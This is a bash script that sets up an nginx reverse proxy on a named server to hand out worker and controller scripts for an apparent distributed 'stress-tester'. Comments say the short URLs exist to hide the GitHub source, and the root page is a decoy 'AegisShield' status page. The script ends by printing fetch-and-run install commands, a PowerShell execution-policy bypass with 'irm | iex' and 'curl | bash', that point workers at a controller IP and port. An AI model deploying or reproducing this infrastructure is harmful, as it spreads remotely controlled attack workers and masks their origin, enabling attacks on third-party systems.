#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  Setup security.o3dn.online — Reverse Proxy for Install Scripts
#  Run on 159.65.32.13:
#    curl -sL https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_domain.sh | bash
# ═══════════════════════════════════════════════════════════════
set -e

DOMAIN="security.o3dn.online"
GITHUB_RAW="https://raw.githubusercontent.com/k4ran909/stress-tester/master"

echo ""
echo "  ╔═══════════════════════════════════════════════════╗"
echo "  ║  Setting up $DOMAIN                    ║"
echo "  ╚═══════════════════════════════════════════════════╝"
echo ""

# ── 1. Install nginx + certbot ────────────────────────────────
echo "  [1/4] Installing nginx & certbot..."
apt-get update -qq
apt-get install -y -qq nginx certbot python3-certbot-nginx >/dev/null 2>&1

# ── 2. Create nginx config ────────────────────────────────────
echo "  [2/4] Creating nginx config..."
cat > /etc/nginx/sites-available/$DOMAIN << 'NGINX'
server {
    listen 80;
    server_name security.o3dn.online;

    # Short URLs — hide GitHub source
    # /w  → Windows worker setup (PowerShell)
    # /wl → Linux worker setup (bash)
    # /c  → Controller setup (bash)
    # /worker.py → raw worker script
    # /controller.py → raw controller script

    location = /w {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.ps1;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
        add_header X-Content-Type-Options "nosniff" always;
    }

    location = /wl {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_worker.sh;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
    }

    location = /c {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/setup_controller.sh;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
    }

    location = /worker.py {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/worker.py;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
    }

    location = /controller.py {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/controller.py;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
    }

    location = /start.py {
        proxy_pass https://raw.githubusercontent.com/k4ran909/stress-tester/master/start.py;
        proxy_ssl_server_name on;
        proxy_set_header Host raw.githubusercontent.com;
        proxy_set_header Accept-Encoding "";
        add_header Content-Type "text/plain; charset=utf-8" always;
    }

    # Root — show status page
    location = / {
        default_type text/html;
        return 200 '<!DOCTYPE html><html><head><title>AegisShield</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{text-align:center;max-width:600px;padding:2rem}.h{color:#ff3333;font-size:1.5rem;margin-bottom:1rem;text-shadow:0 0 20px #ff000066}code{background:#1a1a2e;padding:4px 10px;border-radius:4px;color:#0ff;font-size:.85rem}.s{margin:1.5rem 0;color:#888;font-size:.9rem}a{color:#0ff;text-decoration:none}</style></head><body><div class="c"><div class="h">AEGISSHIELD v5.0</div><p class="s">Authorized Access Only</p><p style="color:#444;font-size:.75rem">Security Infrastructure</p></div></body></html>';
    }

    # Block everything else
    location / {
        return 404;
    }
}
NGINX

# ── 3. Enable site ────────────────────────────────────────────
echo "  [3/4] Enabling site..."
ln -sf /etc/nginx/sites-available/$DOMAIN /etc/nginx/sites-enabled/$DOMAIN
rm -f /etc/nginx/sites-enabled/default 2>/dev/null || true

# Test config
nginx -t 2>/dev/null

# Restart nginx
systemctl enable nginx
systemctl restart nginx

# ── 4. SSL with Let's Encrypt ─────────────────────────────────
echo "  [4/4] Getting SSL certificate..."
certbot --nginx -d $DOMAIN --non-interactive --agree-tos --email admin@o3dn.online --redirect 2>/dev/null || {
    echo "  [!] SSL setup skipped (cert may already exist or DNS not ready)"
    echo "      Run manually: certbot --nginx -d $DOMAIN"
}

# ── Done ──────────────────────────────────────────────────────
echo ""
echo "  ╔═══════════════════════════════════════════════════════════╗"
echo "  ║  ✅ security.o3dn.online is LIVE                          ║"
echo "  ╠═══════════════════════════════════════════════════════════╣"
echo "  ║                                                           ║"
echo "  ║  Clean install commands:                                  ║"
echo "  ║                                                           ║"
echo "  ║  Windows worker:                                          ║"
echo "  ║  powershell -EP Bypass -Command                           ║"
echo "  ║    \"irm https://security.o3dn.online/w | iex\"             ║"
echo "  ║                                                           ║"
echo "  ║  Linux worker:                                            ║"
echo "  ║  curl -sL https://security.o3dn.online/wl | bash         ║"
echo "  ║    -s 159.65.32.13 7777                                   ║"
echo "  ║                                                           ║"
echo "  ║  Controller:                                              ║"
echo "  ║  curl -sL https://security.o3dn.online/c | bash           ║"
echo "  ║                                                           ║"
echo "  ╚═══════════════════════════════════════════════════════════╝"
echo ""
